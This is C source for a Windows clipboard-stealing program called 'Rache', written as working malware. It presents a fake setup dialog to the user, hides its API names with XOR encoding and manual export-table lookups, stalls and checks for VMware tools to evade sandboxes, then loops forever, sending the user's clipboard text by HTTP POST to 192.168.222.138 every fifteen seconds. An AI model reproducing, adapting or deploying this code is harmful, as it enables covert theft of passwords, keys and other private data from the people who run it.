/* Rache */

#include <Windows.h>
#include <wininet.h>
#include <DbgHelp.h>
#include <TlHelp32.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "dbghelp.lib")


HANDLE(WINAPI* pCreateToolhelp32Snapshot)(DWORD, DWORD);
BOOL(WINAPI* pProcess32First)(HANDLE, LPPROCESSENTRY32);
BOOL(WINAPI* pProcess32Next)(HANDLE, LPPROCESSENTRY32);
BOOL(WINAPI* pCloseHandle)(HANDLE);

BOOL(WINAPI* pOpenClipboard)(HWND);
HANDLE(WINAPI* pGetClipboardData)(UINT);
BOOL(WINAPI* pCloseClipboard)();

BYTE xkernel32[] = { 0x5e, 0x50, 0x47, 0x5b, 0x50, 0x59, 0x6, 0x7, 0x1b, 0x51, 0x59, 0x59, 0x00 };
BYTE xcreatetoolhelp32snapshot[] = { 0x76, 0x47, 0x50, 0x54, 0x41, 0x50, 0x61, 0x5a, 0x5a, 0x59, 0x5d, 0x50, 0x59, 0x45, 0x6, 0x7, 0x66, 0x5b, 0x54, 0x45, 0x46, 0x5d, 0x5a, 0x41, 0x00 };
BYTE xprocess32first[] = { 0x65, 0x47, 0x5a, 0x56, 0x50, 0x46, 0x46, 0x6, 0x7, 0x73, 0x5c, 0x47, 0x46, 0x41, 0x00 };
BYTE xprocess32next[] = { 0x65, 0x47, 0x5a, 0x56, 0x50, 0x46, 0x46, 0x6, 0x7, 0x7b, 0x50, 0x4d, 0x41, 0x00 };
BYTE xclosehandle[] = { 0x76, 0x59, 0x5a, 0x46, 0x50, 0x7d, 0x54, 0x5b, 0x51, 0x59, 0x50, 0x00 };
BYTE xgetclipboarddata[] = { 0x72, 0x50, 0x41, 0x76, 0x59, 0x5c, 0x45, 0x57, 0x5a, 0x54, 0x47, 0x51, 0x71, 0x54, 0x41, 0x54, 0x00 };
BYTE xopenclipboard[] = { 0x7a, 0x45, 0x50, 0x5b, 0x76, 0x59, 0x5c, 0x45, 0x57, 0x5a, 0x54, 0x47, 0x51, 0x00 };
BYTE xcloseclipboard[] = { 0x76, 0x59, 0x5a, 0x46, 0x50, 0x76, 0x59, 0x5c, 0x45, 0x57, 0x5a, 0x54, 0x47, 0x51, 0x00 };


VOID XOR(CHAR str[]) {
    CHAR key = 0x35;

    for (SIZE_T i = 0; i < strlen(str); i++)
        str[i] = str[i] ^ key;
}


FARPROC AddrSolution(HMODULE hModule, LPCWSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addrOfFunctions = (PDWORD)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    PWORD addrOfOrdinals = (PWORD)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    PDWORD addrOfNames = (PDWORD)((BYTE*)hModule + exportDirectory->AddressOfNames);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (strcmp(lpProcName, (const char*)hModule + addrOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addrOfFunctions[addrOfOrdinals[i]]);
        }
    }

    return NULL;
}


BOOL CheckVM(const char* procname) {
    HANDLE hToken;
    BOOL ret = FALSE;
    PROCESSENTRY32 pe;
    BOOL res;

    hToken = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hToken == INVALID_HANDLE_VALUE)
        return ret;

    pe.dwSize = sizeof(PROCESSENTRY32);

    if (pProcess32First(hToken, &pe)) {
        do {
            if (strcmp(procname, pe.szExeFile) == 0) {
                ret = TRUE;
                break;
            }
        } while (pProcess32Next(hToken, &pe));
    }

    pCloseHandle(hToken);

    return ret;
}


BOOL RacheSetup() {
    INT res = MessageBoxW(NULL, (LPCWSTR)L"Do you confirm installation the Rache", (LPCWSTR)L"Rache Setup", MB_ICONINFORMATION | MB_YESNO);

    switch (res) {
    case IDYES:
        XOR(xkernel32);
        HMODULE hKernel32 = GetModuleHandleA(xkernel32);
        HMODULE hUser32 = LoadLibraryA("user32.dll");

        if (hUser32 != NULL && hKernel32 != NULL) {
            XOR(xcreatetoolhelp32snapshot);
            pCreateToolhelp32Snapshot = AddrSolution(hKernel32, xcreatetoolhelp32snapshot);

            XOR(xprocess32first);
            pProcess32First = AddrSolution(hKernel32, xprocess32first);
            Sleep(1000);

            XOR(xprocess32next);
            pProcess32Next = AddrSolution(hKernel32, xprocess32next);
            Sleep(1000);

            XOR(xclosehandle);
            pCloseHandle = AddrSolution(hKernel32, xclosehandle);
            Sleep(1000);

            XOR(xopenclipboard);
            pOpenClipboard = AddrSolution(hUser32, xopenclipboard);
            Sleep(1000);

            XOR(xgetclipboarddata);
            pGetClipboardData = AddrSolution(hUser32, xgetclipboarddata);
            Sleep(1000);

            XOR(xcloseclipboard);
            pCloseClipboard = AddrSolution(hUser32, xcloseclipboard);
            Sleep(1000);

            return TRUE;
        }

        break;

    case IDNO:
        return FALSE;

    default:
        return FALSE;
    }
}


BOOL Runtime(HANDLE data) {
    if (data == NULL) {
        return FALSE;
    }

    else {
        BYTE* postData = (BYTE*)malloc(strlen((BYTE*)data) + 1 * sizeof(BYTE*));
        if (postData == NULL) {
            return FALSE;
        }

        else {
            ZeroMemory(postData, strlen((BYTE*)data) + 1 * sizeof(BYTE*));
            RtlMoveMemory(postData, (BYTE*)data, strlen((BYTE*)data));
        }

        HINTERNET hInternet = InternetOpenA(TEXT("Rache"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (hInternet == NULL) {
            free(postData);

            return FALSE;
        }

        HINTERNET hConnect = InternetConnectA(hInternet, TEXT("192.168.222.138"), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect == NULL) {
            InternetCloseHandle(hInternet);
            ZeroMemory(postData, strlen((BYTE*)data) + 1 * sizeof(BYTE*));
            free(postData);

            return FALSE;
        }

        HINTERNET hRequest = HttpOpenRequestA(hConnect, TEXT("POST"), TEXT("/Rache"), NULL, NULL, NULL, 0, 0);
        if (hRequest == NULL) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            ZeroMemory(postData, strlen((BYTE*)data) + 1 * sizeof(BYTE*));
            free(postData);

            return FALSE;
        }

        if (!HttpSendRequestA(hRequest, NULL, 0, (LPVOID)postData, strlen(postData))) {
            InternetCloseHandle(hRequest);
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            ZeroMemory(postData, strlen((BYTE*)data) + 1 * sizeof(BYTE*));
            free(postData);

            return FALSE;
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        ZeroMemory(postData, strlen((BYTE*)data) + 1 * sizeof(BYTE*));
        free(postData);

        return TRUE;
    }
}


HANDLE getData() {
    pOpenClipboard(NULL);
    HANDLE hData = pGetClipboardData(CF_TEXT);
    if (hData != NULL) {
        pCloseClipboard();
        return hData;
    }

    pCloseClipboard();

    return NULL;
}


int main() {
    BOOL ret = RacheSetup();

    if (ret != FALSE) {
        char* mem = malloc(100000000);

        if (mem != NULL) {
            memset(mem, 00, 100000000);
            Sleep(15000);
            free(mem);

            BOOL retval = CheckVM("vmtoolsd.exe");

            if (retval == TRUE) { // If you work in your own VM change it value as FALSE
                MessageBoxW(NULL, (LPCWSTR)L"Rache sometimes making error", (LPCWSTR)L"Rache Setup", MB_OK | MB_ICONINFORMATION);
                Sleep(10000);

                ExitProcess(0);
            }

            MessageBoxW(NULL, (LPCWSTR)L"Rache has been installed", (LPCWSTR)L"Rache Setup", MB_OK);
            Sleep(3000);
        }

        else {
            ExitProcess(0);
        }

        while (TRUE) {
            HANDLE data;
            data = getData();

            Runtime(data);
            Sleep(15000);

        }
    }

    return 0;
}